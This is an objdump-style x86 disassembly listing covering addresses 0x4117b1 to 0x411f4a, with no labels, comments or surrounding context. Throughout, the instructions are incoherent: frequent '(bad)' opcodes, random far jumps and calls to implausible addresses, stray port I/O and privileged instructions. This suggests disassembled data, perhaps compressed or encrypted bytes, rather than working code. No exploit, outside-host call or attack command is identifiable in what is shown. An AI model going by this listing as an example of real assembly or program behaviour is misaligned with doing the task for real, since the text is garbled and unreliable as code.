  4117b1:	push   0x7c2ed902
  4117b6:	fadd   DWORD PTR [eax-0x7c]
  4117b9:	aam    0x1f
  4117bb:	dec    ebp
  4117bc:	inc    ecx
  4117bd:	fbld   TBYTE PTR [edi-0x1bd0127a]
  4117c3:	inc    esp
  4117c4:	sub    BYTE PTR [eax-0x4c88bcdd],dh
  4117ca:	pop    edi
  4117cb:	dec    esi
  4117cc:	ret    0x2042
  4117cf:	mov    bl,0xd2
  4117d1:	sub    eax,0x88787582
  4117d6:	jmp    0x411837
  4117d8:	inc    eax
  4117d9:	mov    dl,0xe0
  4117db:	mov    ds:0xc3fdeef3,al
  4117e0:	(bad)  
  4117e1:	(bad)  [ecx]
  4117e3:	jmp    0xb5cf6f8e
  4117e8:	and    DWORD PTR [ebp+0x79],edi
  4117eb:	sub    edx,ebx
  4117ed:	int    0xbf
  4117ef:	sbb    ah,al
  4117f1:	cmc    
  4117f2:	fs gs push esi
  4117f5:	lods   al,BYTE PTR ds:[esi]
  4117f6:	jmp    0x8062:0x56abfcd1
  4117fd:	mov    ecx,0x344f9343
  411802:	loopne 0x41178e
  411804:	xchg   ecx,eax
  411805:	outs   dx,DWORD PTR ds:[esi]
  411806:	es push edi
  411808:	shl    DWORD PTR [eax+0x1c],cl
  41180b:	repnz and al,0x85
  41180e:	pop    edi
  41180f:	ror    DWORD PTR [eax+ebp*1+0xd94d3b1],0x90
  411817:	jmp    0xe244:0x7e0ae624
  41181e:	mov    dl,0x39
  411820:	lods   al,BYTE PTR ds:[esi]
  411821:	xor    al,0xed
  411823:	sbb    al,0x9c
  411825:	and    ecx,DWORD PTR [eax-0x50]
  411828:	push   edi
  411829:	cmp    edx,DWORD PTR [ecx]
  41182b:	xchg   ebx,eax
  41182c:	outs   dx,BYTE PTR gs:[esi]
  41182e:	cmp    DWORD PTR [ebx-0x600b7773],ebp
  411834:	aam    0x25
  411836:	lock xchg esi,eax
  411838:	not    ah
  41183a:	pop    eax
  41183b:	pusha  
  41183c:	sbb    bl,BYTE PTR [ebx+eax*1+0x47]
  411840:	std    
  411841:	mov    cl,0xa5
  411843:	jp     0x411893
  411845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411846:	mov    al,ds:0x9baef6dd
  41184b:	xchg   ecx,eax
  41184c:	mov    bh,0x8d
  41184e:	retf   
  41184f:	mov    DWORD PTR [edx+edx*1-0x12a6e195],eax
  411856:	dec    eax
  411857:	add    al,0x46
  411859:	hlt    
  41185a:	icebp  
  41185b:	jbe    0x4118bb
  41185d:	mov    dl,0x57
  41185f:	xchg   BYTE PTR [edx+0x67],bl
  411862:	and    bh,ah
  411864:	retw   
  411866:	into   
  411867:	in     al,0x6b
  411869:	or     DWORD PTR [ebp-0x3b],esi
  41186c:	pop    ecx
  41186d:	jo     0x4118c0
  41186f:	push   ds
  411870:	iret   
  411871:	pop    ss
  411872:	in     eax,0x71
  411874:	jo     0x411838
  411876:	into   
  411877:	aaa    
  411878:	mov    al,0x33
  41187a:	mov    ah,0x94
  41187c:	pop    edx
  41187d:	add    eax,0x72dd5f4c
  411882:	loop   0x411806
  411884:	cmp    si,WORD PTR [ebx]
  411887:	jo     0x4118f2
  411889:	jbe    0x4118fc
  41188b:	xchg   edi,eax
  41188c:	addr16 xor al,0xc8
  41188f:	sbb    eax,0xd7671a95
  411894:	xor    DWORD PTR [edi],edx
  411896:	cmp    esp,DWORD PTR [ecx]
  411898:	icebp  
  411899:	ins    DWORD PTR es:[edi],dx
  41189a:	lea    esi,[edx]
  41189c:	aam    0xef
  41189e:	sub    ch,ah
  4118a0:	lds    edx,FWORD PTR [esi]
  4118a2:	mov    ebx,0xaf027d4f
  4118a7:	call   0x9f63fe0c
  4118ac:	jge    0x411848
  4118ae:	add    BYTE PTR ds:0x635aab31,dh
  4118b4:	adc    DWORD PTR [ebp-0x7d333edc],0x6f
  4118bb:	mov    WORD PTR [esi],es
  4118bd:	fwait
  4118be:	cli    
  4118bf:	sbb    ebx,DWORD PTR [edx+0x2a]
  4118c2:	jmp    0xb0d8:0xb38459eb
  4118c9:	pop    ss
  4118ca:	jp     0x41184e
  4118cc:	ret    
  4118cd:	data16 cmp bl,BYTE PTR [ecx]
  4118d0:	sub    eax,0xc0d1bb24
  4118d5:	ret    0x849
  4118d8:	int    0xf7
  4118da:	pop    ecx
  4118db:	ret    
  4118dc:	int3   
  4118dd:	jp     0x41188a
  4118df:	imul   esi,DWORD PTR [ebp+edx*4+0x382579e7],0xffffffd2
  4118e7:	jle    0x4118a9
  4118e9:	or     DWORD PTR [edi+ebp*4+0x46],ebx
  4118ed:	ja     0x4118e1
  4118ef:	adc    BYTE PTR ss:[ecx-0xb3e570a],ch
  4118f6:	fcom   DWORD PTR [edi+ecx*8+0x50c1203]
  4118fd:	xchg   DWORD PTR [ecx-0x22],esi
  411900:	mov    DWORD PTR [esi+0x5427c763],edi
  411906:	push   esp
  411907:	mov    WORD PTR [edi+eax*8-0x652ea399],es
  41190e:	loope  0x411925
  411910:	scas   eax,DWORD PTR es:[edi]
  411911:	pop    edx
  411912:	out    0x46,al
  411914:	cdq    
  411915:	(bad)  
  411916:	jmp    0x4118b9
  411918:	inc    eax
  411919:	inc    edi
  41191a:	push   0xae405bdc
  41191f:	scas   eax,DWORD PTR es:[edi]
  411920:	xchg   ebx,eax
  411921:	sub    DWORD PTR [edi+0x71],ebp
  411924:	adc    ebx,0xa1e6b78f
  41192a:	xchg   esi,eax
  41192b:	mov    bh,0xed
  41192d:	jge    0x41196b
  41192f:	add    al,0xa6
  411931:	mov    al,0xbe
  411933:	repz pop eax
  411935:	jmp    0x411956
  411937:	cli    
  411938:	test   dl,dh
  41193a:	int3   
  41193b:	bound  esp,QWORD PTR [ebx+0x7a]
  41193e:	or     eax,0xa434bc5f
  411943:	outs   dx,DWORD PTR ds:[esi]
  411944:	push   esp
  411945:	test   al,0x35
  411947:	dec    edx
  411948:	aaa    
  411949:	mov    edi,0x26c30e1
  41194e:	push   esp
  41194f:	out    0x75,al
  411951:	mov    ds:0x661fd83e,eax
  411956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411957:	or     al,0xf9
  411959:	and    ah,0x69
  41195c:	pop    esp
  41195d:	fsub   DWORD PTR [edx]
  41195f:	(bad)  
  411960:	retf   
  411961:	jge    0x4119da
  411963:	js     0x4119cb
  411965:	or     dl,BYTE PTR [ebp+eax*4+0x49]
  411969:	xor    esp,ebp
  41196b:	rcl    DWORD PTR [esi+0x7ffcf3a8],0x4a
  411972:	mov    ebp,DWORD PTR [edi-0x99e74fd]
  411978:	lods   eax,DWORD PTR ds:[esi]
  411979:	inc    ebp
  41197a:	ret    0x55df
  41197d:	out    dx,eax
  41197e:	xchg   DWORD PTR [edx],edx
  411980:	sbb    DWORD PTR [ebp-0x11434308],esp
  411986:	mov    eax,DWORD PTR [ebx+0x5c]
  411989:	mov    edi,0xa12493fb
  41198e:	stc    
  41198f:	enter  0x9dc8,0xd2
  411993:	jnp    0x4119f0
  411995:	mov    dl,ah
  411997:	lds    edi,FWORD PTR [edi]
  411999:	xchg   edx,eax
  41199a:	sub    BYTE PTR [ecx-0x3153367f],bh
  4119a0:	mov    ds:0x8894f399,al
  4119a5:	sahf   
  4119a6:	add    DWORD PTR [edi],ebx
  4119a8:	jmp    0xfd2a45f6
  4119ad:	add    DWORD PTR [edx-0x2c98328b],edx
  4119b3:	push   ss
  4119b4:	mov    ebp,gs
  4119b6:	sub    BYTE PTR [edx+0x5a143bcb],dh
  4119bc:	daa    
  4119bd:	jg     0x411a12
  4119bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119c0:	dec    eax
  4119c1:	dec    ebp
  4119c2:	dec    edi
  4119c3:	dec    esp
  4119c4:	in     eax,0x9
  4119c6:	sbb    cl,BYTE PTR [ecx+0x72]
  4119c9:	xchg   ebx,eax
  4119ca:	push   es
  4119cb:	push   ss
  4119cc:	jmp    0x574ada74
  4119d1:	jl     0x4119db
  4119d3:	mov    esi,0x29c312bc
  4119d8:	neg    BYTE PTR [ecx+0x3e9ebede]
  4119de:	or     ebp,DWORD PTR [ebx]
  4119e0:	push   ebp
  4119e1:	popf   
  4119e2:	jmp    0xf114:0xe23ffec
  4119e9:	dec    ecx
  4119eb:	mov    WORD PTR [ebx-0x7aa57f5a],fs
  4119f1:	jge    0x411996
  4119f3:	xchg   esp,eax
  4119f4:	sahf   
  4119f5:	cmp    DWORD PTR [edx],edi
  4119f7:	enter  0x147a,0x34
  4119fb:	sbb    esp,DWORD PTR [ecx-0x42]
  4119fe:	push   edx
  4119ff:	lahf   
  411a00:	lods   al,BYTE PTR ds:[esi]
  411a01:	jge    0x4119ee
  411a03:	cld    
  411a04:	xchg   ebx,eax
  411a05:	test   BYTE PTR [ebx-0x1b],bh
  411a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a09:	jnp    0x411a65
  411a0b:	shl    BYTE PTR [ecx+0x8e90659],cl
  411a11:	inc    eax
  411a12:	jae    0x4119d4
  411a14:	or     eax,0x7c1de5e3
  411a19:	push   0xe
  411a1b:	add    DWORD PTR ds:0xef784daa,edi
  411a21:	add    ebp,DWORD PTR ds:0xc3f28af2
  411a27:	cli    
  411a28:	leave  
  411a29:	mov    esp,0x6acab217
  411a2e:	add    BYTE PTR [edi+0x5d],bh
  411a31:	pop    ebx
  411a32:	test   eax,0x87143252
  411a37:	pop    esi
  411a38:	sub    al,0x34
  411a3a:	aas    
  411a3b:	in     al,0x81
  411a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a3e:	mov    ds:0xea9f9322,eax
  411a43:	shr    ecx,1
  411a45:	jp     0x411aa3
  411a47:	std    
  411a48:	inc    esp
  411a49:	fmul   st(2),st
  411a4b:	inc    ecx
  411a4c:	xchg   edi,eax
  411a4d:	inc    edx
  411a4e:	mov    ah,0x7d
  411a50:	sub    DWORD PTR [ebx],esi
  411a52:	icebp  
  411a53:	inc    ecx
  411a54:	mov    ds:0x1cd77d17,eax
  411a59:	das    
  411a5a:	div    DWORD PTR ss:[ebx+0x309ce8ed]
  411a61:	xor    ebp,DWORD PTR [ebx-0x69]
  411a64:	cmp    al,0x91
  411a66:	(bad)  
  411a67:	out    dx,eax
  411a68:	stos   DWORD PTR es:[edi],eax
  411a69:	out    dx,al
  411a6a:	pop    ebp
  411a6b:	idiv   BYTE PTR [ecx+0x4b0aa7bf]
  411a71:	stos   DWORD PTR es:[edi],eax
  411a72:	xor    ah,BYTE PTR [edx-0x73]
  411a75:	adc    eax,0x2a4ccf2b
  411a7a:	in     eax,dx
  411a7b:	push   ecx
  411a7c:	jecxz  0x411a82
  411a7e:	xchg   esp,esp
  411a80:	ficom  DWORD PTR [edx]
  411a82:	inc    eax
  411a83:	pop    ebp
  411a84:	xlat   BYTE PTR ds:[ebx]
  411a85:	test   DWORD PTR [edi+0x7],esp
  411a88:	inc    esp
  411a89:	repnz les edi,FWORD PTR [eiz*4+0x62388d5a]
  411a91:	mov    DWORD PTR [edi+0x7d],0x57e42f23
  411a98:	sub    DWORD PTR [eax+eiz*4-0x2a6f3c43],edi
  411a9f:	out    0x60,al
  411aa1:	xor    DWORD PTR [eax],ebp
  411aa3:	xor    ebx,esi
  411aa5:	fst    QWORD PTR [ebx+0x1a]
  411aa8:	shl    BYTE PTR [eax-0x63],0x17
  411aac:	aas    
  411aad:	out    dx,al
  411aae:	xor    al,BYTE PTR [eax-0x786fc4f7]
  411ab4:	sbb    ecx,DWORD PTR [eax]
  411ab6:	and    DWORD PTR [ecx+0x75],0x8d4d0cd2
  411abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411abe:	and    DWORD PTR [edi-0x4bf6088c],esi
  411ac4:	xchg   ecx,eax
  411ac5:	pop    ecx
  411ac6:	inc    ecx
  411ac7:	xchg   ebx,eax
  411ac8:	mov    edx,0x238b19ee
  411acd:	popf   
  411ace:	mov    cl,0x7
  411ad0:	dec    eax
  411ad1:	xchg   edi,eax
  411ad2:	mov    ds:0xb6ff65d4,al
  411ad7:	xlat   BYTE PTR ds:[ebx]
  411ad8:	jl     0x411ad2
  411ada:	inc    BYTE PTR [esi]
  411adc:	or     eax,DWORD PTR [ebx]
  411ade:	mov    edx,0x5d6001d
  411ae3:	sbb    edx,DWORD PTR cs:[edi-0x54f55922]
  411aea:	aas    
  411aeb:	xchg   DWORD PTR [ecx*4-0x4f1874e0],edx
  411af2:	jl     0x411a95
  411af4:	out    dx,al
  411af5:	jg     0x411b2f
  411af7:	test   DWORD PTR [ebp+0x169eeb61],esp
  411afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411afe:	loope  0x411ac7
  411b00:	push   ss
  411b01:	retf   0xecb5
  411b04:	add    DWORD PTR [ebx-0x3b],eax
  411b07:	test   al,0xe2
  411b09:	inc    eax
  411b0a:	pop    ecx
  411b0b:	cmc    
  411b0c:	sbb    DWORD PTR [edx-0x26],ebx
  411b0f:	or     DWORD PTR [eax+0x6fd6452d],0x17
  411b16:	ror    DWORD PTR [eax],0xf5
  411b19:	pop    edi
  411b1a:	pop    edi
  411b1b:	dec    edi
  411b1c:	cdq    
  411b1d:	in     eax,0x41
  411b1f:	lock nop
  411b21:	std    
  411b22:	inc    edx
  411b23:	add    al,0xfe
  411b25:	inc    edi
  411b26:	jne    0x411ae3
  411b28:	into   
  411b29:	ret    
  411b2a:	scas   eax,DWORD PTR es:[edi]
  411b2b:	jge    0x411adf
  411b2d:	cmp    eax,0xaa65dadb
  411b32:	out    0xca,eax
  411b34:	jge    0x411b1e
  411b36:	adc    eax,0xd24aba07
  411b3b:	addr16 sahf 
  411b3d:	mov    dl,0x9a
  411b3f:	mov    eax,0x771a8e30
  411b44:	stos   BYTE PTR es:[edi],al
  411b45:	jp     0x411af0
  411b47:	out    0xcb,eax
  411b49:	xor    eax,0x74f83b91
  411b4e:	outs   dx,BYTE PTR ds:[esi]
  411b4f:	cmp    DWORD PTR [edi+ebp*1-0x6e],eax
  411b53:	inc    ecx
  411b54:	pop    esi
  411b55:	stc    
  411b56:	mov    ds,WORD PTR [edx]
  411b58:	xor    eax,0x35d39cb2
  411b5d:	les    ebx,FWORD PTR [eax+0x42a59292]
  411b63:	pusha  
  411b64:	jmp    0x411bcc
  411b66:	jge    0x411bc7
  411b68:	test   al,0xbb
  411b6a:	dec    edi
  411b6b:	sbb    eax,0x3257d24d
  411b70:	lds    edi,FWORD PTR [esp+esi*4+0x5]
  411b74:	test   DWORD PTR cs:[ebp+0x228083dc],esp
  411b7b:	call   0x4201a521
  411b80:	adc    al,0xc2
  411b82:	int3   
  411b83:	dec    esp
  411b84:	fwait
  411b85:	icebp  
  411b86:	xchg   ecx,eax
  411b87:	mov    ch,0x11
  411b89:	or     eax,0xe8ba0405
  411b8e:	aas    
  411b8f:	lahf   
  411b90:	cwde   
  411b91:	xchg   edx,eax
  411b92:	ins    DWORD PTR es:[edi],dx
  411b93:	pop    eax
  411b94:	mov    eax,ds:0xc483942a
  411b99:	and    DWORD PTR [edi-0x48],ebp
  411b9c:	fnstenv [eax]
  411b9e:	shr    bl,0x8f
  411ba1:	add    eax,0x5446da2f
  411ba6:	hlt    
  411ba7:	call   0xd41c21f6
  411bac:	or     dl,BYTE PTR [ebx]
  411bae:	test   bh,dh
  411bb0:	xchg   esp,eax
  411bb1:	xchg   esi,eax
  411bb2:	fmul   QWORD PTR [eax]
  411bb4:	cmp    al,0x89
  411bb6:	mov    ds:0xa2e1cb05,eax
  411bbb:	sahf   
  411bbc:	(bad)  
  411bbd:	sbb    dl,ch
  411bbf:	pushf  
  411bc0:	push   ss
  411bc1:	jmp    DWORD PTR [esi]
  411bc3:	(bad)  
  411bc4:	in     eax,dx
  411bc5:	inc    edx
  411bc6:	pop    ecx
  411bc7:	fdiv   QWORD PTR [edx+0x31be5a4e]
  411bcd:	push   esp
  411bce:	inc    eax
  411bcf:	add    al,0x9a
  411bd1:	inc    ecx
  411bd2:	leave  
  411bd3:	stc    
  411bd4:	ds and ebp,ebp
  411bd7:	dec    ebx
  411bd8:	ret    
  411bd9:	mov    ch,0x84
  411bdb:	inc    edx
  411bdc:	push   ebx
  411bdd:	stos   DWORD PTR es:[edi],eax
  411bde:	daa    
  411bdf:	xchg   ebx,eax
  411be0:	ins    DWORD PTR es:[edi],dx
  411be1:	test   eax,0x55643c05
  411be6:	pop    ebx
  411be7:	pop    ds
  411be8:	fcom   QWORD PTR [esp+ecx*1]
  411beb:	adc    BYTE PTR [edi-0x2f],dh
  411bee:	retf   0x9cb
  411bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bf2:	icebp  
  411bf3:	fcmovbe st,st(1)
  411bf5:	and    DWORD PTR [esi],edx
  411bf7:	push   esi
  411bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bf9:	test   al,0x2a
  411bfb:	and    DWORD PTR [eax],edi
  411bfd:	aas    
  411bfe:	out    0x9a,eax
  411c00:	xchg   ebx,eax
  411c01:	push   es
  411c02:	lods   al,BYTE PTR ds:[esi]
  411c03:	inc    ecx
  411c04:	add    dl,dh
  411c06:	lds    edi,FWORD PTR [edi]
  411c08:	popa   
  411c09:	fimul  DWORD PTR [esi-0x2b]
  411c0c:	lahf   
  411c0d:	repz sub ebx,eax
  411c10:	jge    0x411c54
  411c12:	fdiv   DWORD PTR [eax-0x8f9e8bb]
  411c18:	retf   0xdf1d
  411c1b:	add    edx,DWORD PTR [esi]
  411c1d:	mov    esi,DWORD PTR [ebx]
  411c1f:	pop    esp
  411c20:	add    ebx,DWORD PTR ds:0x62c7e4ff
  411c26:	jo     0x411bfd
  411c28:	outs   dx,BYTE PTR ds:[esi]
  411c29:	int    0x79
  411c2b:	fldl2t 
  411c2d:	xchg   DWORD PTR [ecx-0x6b],ebx
  411c30:	js     0x411cab
  411c32:	lea    edi,ds:0xdf20811d
  411c38:	xchg   edx,eax
  411c39:	xchg   DWORD PTR [esi+0x237fb555],edx
  411c3f:	mov    eax,ds:0x569d8f0c
  411c44:	pop    edi
  411c45:	retf   
  411c46:	mov    dl,0x76
  411c48:	popa   
  411c49:	push   ss
  411c4a:	into   
  411c4b:	fnstenv [ebx+esi*4-0x65473faf]
  411c52:	add    BYTE PTR [ebx+0x1a6f43bf],bh
  411c58:	js     0x411c48
  411c5a:	arpl   sp,di
  411c5c:	fld    DWORD PTR [eax+0x6e]
  411c5f:	jns    0x411c33
  411c61:	or     cl,BYTE PTR [eax-0x69]
  411c64:	pop    edx
  411c65:	pop    edx
  411c66:	and    eax,0x381e87e6
  411c6b:	mov    ch,0x8b
  411c6d:	push   edx
  411c6e:	fcmovbe st,st(3)
  411c70:	or     DWORD PTR [eax+0x27],esi
  411c73:	xor    al,0xfb
  411c75:	ja     0x411c61
  411c77:	shl    DWORD PTR [ecx+0x30f9b1ec],cl
  411c7d:	jo     0x411c24
  411c7f:	fs jnp 0x411c8c
  411c82:	pop    ebp
  411c83:	push   0xcb0ee8b6
  411c88:	push   ds
  411c89:	leave  
  411c8a:	fiadd  WORD PTR [edi+0x61597416]
  411c90:	popa   
  411c91:	pop    eax
  411c92:	aaa    
  411c93:	jne    0x411ce0
  411c95:	fsub   QWORD PTR [ecx+ebx*2-0x719dc519]
  411c9c:	test   al,0xdb
  411c9e:	stos   DWORD PTR es:[edi],eax
  411c9f:	inc    edi
  411ca0:	pop    esi
  411ca1:	gs icebp 
  411ca3:	shl    ebx,1
  411ca5:	jle    0x411ce0
  411ca7:	loope  0x411d10
  411ca9:	push   edx
  411caa:	dec    esp
  411cab:	dec    ebx
  411cac:	mov    esp,0x607ca11f
  411cb1:	iret   
  411cb2:	xchg   DWORD PTR [ecx-0x1b],ecx
  411cb5:	loope  0x411d1f
  411cb7:	jns    0x411ce2
  411cb9:	enter  0xdb8a,0x50
  411cbd:	call   0x1bd2356
  411cc2:	pop    ss
  411cc3:	cs mov ecx,0xead9933d
  411cc9:	popf   
  411cca:	mov    ebx,0x1742149c
  411ccf:	ret    
  411cd0:	arpl   bp,ax
  411cd2:	and    al,0xca
  411cd4:	mov    esi,0xb40a7459
  411cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cda:	mov    ds:0x824d8aee,al
  411cdf:	jnp    0x411c85
  411ce1:	(bad)  
  411ce2:	mov    eax,0x9ac683b0
  411ce7:	cmp    al,0xf6
  411ce9:	fld    QWORD PTR [eax]
  411ceb:	xchg   ebp,eax
  411cec:	fwait
  411ced:	push   esi
  411cee:	pop    ebp
  411cef:	mov    esi,0xfaff73c0
  411cf4:	lods   al,BYTE PTR ds:[esi]
  411cf5:	sbb    cl,BYTE PTR [edi-0x7f]
  411cf8:	lods   eax,DWORD PTR ds:[esi]
  411cf9:	das    
  411cfa:	loope  0x411c8c
  411cfc:	xor    DWORD PTR [ebp+0x5a],ebx
  411cff:	fldenv [ebp-0x47]
  411d02:	rcr    esp,1
  411d04:	ret    0x43c6
  411d07:	dec    edx
  411d08:	popa   
  411d09:	mov    ah,0xdf
  411d0b:	xlat   BYTE PTR ds:[ebx]
  411d0c:	inc    edi
  411d0d:	sbb    eax,0x57880092
  411d12:	div    DWORD PTR [ecx]
  411d14:	std    
  411d15:	fs jns 0x411d2a
  411d18:	sahf   
  411d19:	popf   
  411d1a:	retf   0xdf50
  411d1d:	mov    edx,0x755d431e
  411d22:	clc    
  411d23:	and    al,0x87
  411d25:	and    esp,ebp
  411d27:	in     eax,0x44
  411d29:	sar    edx,0xf2
  411d2c:	mov    eax,0x61d81b5c
  411d31:	pushf  
  411d32:	xchg   edi,eax
  411d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d34:	and    dh,BYTE PTR [edx+0x67351ec8]
  411d3a:	in     al,dx
  411d3b:	and    BYTE PTR [edi],al
  411d3d:	jo     0x411cf5
  411d3f:	mov    edx,0x8afcc0b0
  411d44:	vaddpd xmm0,xmm0,XMMWORD PTR [esi-0x564ebb32]
  411d4c:	inc    ebp
  411d4d:	int3   
  411d4e:	loope  0x411d23
  411d50:	and    eax,0xbeccdbc4
  411d55:	in     al,0xe8
  411d57:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  411d59:	xchg   edx,eax
  411d5a:	aas    
  411d5b:	and    edi,0x86b89e1f
  411d61:	bound  eax,QWORD PTR [eax-0x67]
  411d64:	jge    0x411dcb
  411d66:	sub    BYTE PTR [esi+0xe776eff],0x15
  411d6d:	xchg   edx,eax
  411d6e:	shr    BYTE PTR [ecx+0x47e1a4df],1
  411d74:	push   esi
  411d75:	sub    al,0x19
  411d77:	xor    BYTE PTR [esi+0x197c0f24],0xf5
  411d7e:	pop    ds
  411d7f:	jbe    0x411d2e
  411d81:	adc    al,0x1b
  411d83:	das    
  411d84:	mov    edi,0xc10d628
  411d89:	not    BYTE PTR ds:0x88b38e28
  411d8f:	aad    0xbc
  411d91:	pushf  
  411d92:	call   0x3b93b358
  411d97:	stos   DWORD PTR es:[edi],eax
  411d98:	lods   al,BYTE PTR ds:[esi]
  411d99:	je     0x411d4b
  411d9b:	dec    ebx
  411d9c:	pusha  
  411d9d:	neg    BYTE PTR [edx-0x3]
  411da0:	arpl   WORD PTR [ecx+ebx*1-0x282e394f],dx
  411da7:	push   ss
  411da8:	clc    
  411da9:	mov    edi,0x5a509e06
  411dae:	xchg   ebx,eax
  411daf:	add    BYTE PTR [edx],0x45
  411db2:	mov    WORD PTR [esi+0x1050222d],?
  411db8:	cmp    eax,0x7fe7b3ec
  411dbd:	sub    BYTE PTR [ebx-0x171a209],bh
  411dc3:	retf   0xb727
  411dc6:	mov    ch,0x92
  411dc8:	(bad)  
  411dc9:	push   ds
  411dca:	mov    ebx,eax
  411dcc:	pusha  
  411dcd:	cmp    al,0x7a
  411dcf:	pop    edx
  411dd0:	push   edx
  411dd1:	add    al,0x85
  411dd3:	mov    eax,0x2ff64949
  411dd8:	xchg   ebp,eax
  411dd9:	js     0x411e45
  411ddb:	repz in al,0x1f
  411dde:	add    BYTE PTR [esi+ebp*8],bh
  411de1:	xchg   DWORD PTR [esi+0x57],esp
  411de4:	and    DWORD PTR [edi],eax
  411de6:	int3   
  411de7:	cmp    ebx,ebx
  411de9:	inc    DWORD PTR [ebx]
  411deb:	lods   eax,DWORD PTR ds:[esi]
  411dec:	(bad)  
  411ded:	gs scas al,BYTE PTR es:[edi]
  411def:	jbe    0x411e53
  411df1:	or     dl,BYTE PTR [esi+eax*8+0x2e8f12d]
  411df8:	adc    eax,0xb6facb87
  411dfd:	dec    edx
  411dfe:	jns    0x411e12
  411e00:	push   ss
  411e01:	fwait
  411e02:	push   ss
  411e03:	cmc    
  411e04:	retf   0x98c0
  411e07:	dec    edx
  411e08:	jb     0x411d92
  411e0a:	popf   
  411e0b:	pop    ebp
  411e0c:	fwait
  411e0d:	test   al,0x49
  411e0f:	imul   esp,DWORD PTR [eax-0x1b],0xffffffea
  411e13:	leave  
  411e14:	pop    esi
  411e15:	fist   DWORD PTR [edi+ebp*8+0x65722f94]
  411e1c:	dec    eax
  411e1d:	cmp    eax,0x4c0b03d0
  411e22:	pop    edx
  411e23:	jo     0x411db9
  411e25:	push   esi
  411e26:	pushf  
  411e27:	xchg   esi,eax
  411e28:	push   ds
  411e29:	cmp    al,0x56
  411e2b:	mov    cl,0x8e
  411e2d:	push   esi
  411e2e:	sbb    BYTE PTR [edi],dh
  411e30:	cmc    
  411e31:	lea    ebp,[esp+eax*1+0x4c]
  411e35:	loop   0x411e4f
  411e37:	add    DWORD PTR [edx+0x5e80897a],ecx
  411e3d:	inc    edx
  411e3e:	sbb    DWORD PTR [ecx+0x75],0x58a12b3e
  411e45:	mov    al,0x72
  411e47:	mov    al,ds:0xc42f94cd
  411e4c:	(bad)  
  411e4d:	pop    ebp
  411e4e:	mov    bh,0xf4
  411e50:	leave  
  411e51:	sti    
  411e52:	es add al,0xa0
  411e55:	cmp    bh,bl
  411e57:	add    esi,DWORD PTR [esi+0x62]
  411e5a:	mov    ah,0xa8
  411e5c:	mov    esi,DWORD PTR [edi-0x7c]
  411e5f:	inc    esp
  411e60:	loopne 0x411e60
  411e62:	xchg   ecx,eax
  411e63:	jp     0x411e12
  411e65:	repz iret 
  411e67:	scas   eax,DWORD PTR es:[edi]
  411e68:	xor    DWORD PTR [ebp-0x64c6a041],eax
  411e6e:	mov    dh,0x72
  411e70:	stc    
  411e71:	dec    esp
  411e72:	add    dl,BYTE PTR [ecx+0x23200ac6]
  411e78:	dec    esp
  411e79:	addr16 cmp dl,dl
  411e7c:	push   edi
  411e7d:	jae    0x411e88
  411e7f:	call   0x6b541042
  411e84:	sbb    esp,DWORD PTR [esi-0x2d059c98]
  411e8a:	(bad)
  411e8d:	mov    DWORD PTR [edx],esi
  411e8f:	add    ebp,DWORD PTR [ebx+0x23]
  411e92:	jbe    0x411e79
  411e94:	dec    edi
  411e95:	mov    al,0x54
  411e97:	scas   al,BYTE PTR es:[edi]
  411e98:	mov    al,ds:0xfcc41795
  411e9d:	cwde   
  411e9e:	cld    
  411e9f:	hlt    
  411ea0:	test   al,0xee
  411ea2:	push   ds
  411ea3:	xor    BYTE PTR [di+0x393],dh
  411ea8:	jg     0x411e6d
  411eaa:	add    ch,al
  411eac:	xchg   esi,eax
  411ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eae:	add    BYTE PTR [ebp-0x342e2be6],ch
  411eb4:	fwait
  411eb5:	retf   0x9aa3
  411eb8:	sub    DWORD PTR [edi-0x195b7d73],edx
  411ebe:	jno    0x411f15
  411ec0:	dec    esi
  411ec1:	cs mov esi,0xaedaceb1
  411ec7:	jne    0x411e65
  411ec9:	sbb    eax,0x320cf2a
  411ece:	xchg   BYTE PTR [ebx+0x45],ah
  411ed1:	mov    ds:0x31328097,eax
  411ed6:	(bad)  
  411ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ed8:	inc    ebx
  411ed9:	fsubr  st(4),st
  411edb:	imul   BYTE PTR [ebx-0x56f3fd67]
  411ee1:	add    bl,ch
  411ee3:	ret    
  411ee4:	scas   al,BYTE PTR es:[edi]
  411ee5:	in     al,0x2a
  411ee7:	xor    al,0x1e
  411ee9:	sub    esi,DWORD PTR [edx-0x5b279fe1]
  411eef:	inc    edx
  411ef0:	mov    ds:0xb147e0ef,al
  411ef5:	lods   eax,DWORD PTR ds:[esi]
  411ef6:	push   0xab2c46a9
  411efb:	cmc    
  411efc:	sub    cl,bh
  411efe:	or     dl,cl
  411f00:	enter  0x796e,0x54
  411f04:	mov    dl,0xdf
  411f06:	xor    al,0xd8
  411f08:	rcl    BYTE PTR [eax+0x0],0xaa
  411f0c:	retf   0x3071
  411f0f:	add    cl,al
  411f11:	and    al,0x0
  411f13:	adc    eax,0xf6e27c81
  411f18:	pop    ecx
  411f19:	dec    esp
  411f1a:	mov    ecx,0xe403f21f
  411f1f:	inc    edi
  411f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f21:	mov    ecx,DWORD PTR [ebp+0x169eb1c0]
  411f27:	cmc    
  411f28:	mov    ds:0x49778781,al
  411f2d:	mov    edx,0xe0f86558
  411f32:	js     0x411f16
  411f34:	jp     0x411ecf
  411f36:	(bad)  
  411f37:	leave  
  411f38:	push   edx
  411f39:	(bad)  
  411f3a:	dec    edx
  411f3b:	cmp    DWORD PTR [edi],esp
  411f3d:	fwait
  411f3e:	out    dx,eax
  411f3f:	jp     0x411f09
  411f41:	jle    0x411f53
  411f43:	lock fldz 
  411f46:	cmc    
  411f47:	pop    ds
  411f48:	cld    
  411f49:	push   ebp
  411f4a:	cmp    BYTE PTR [ecx+0x61],bl
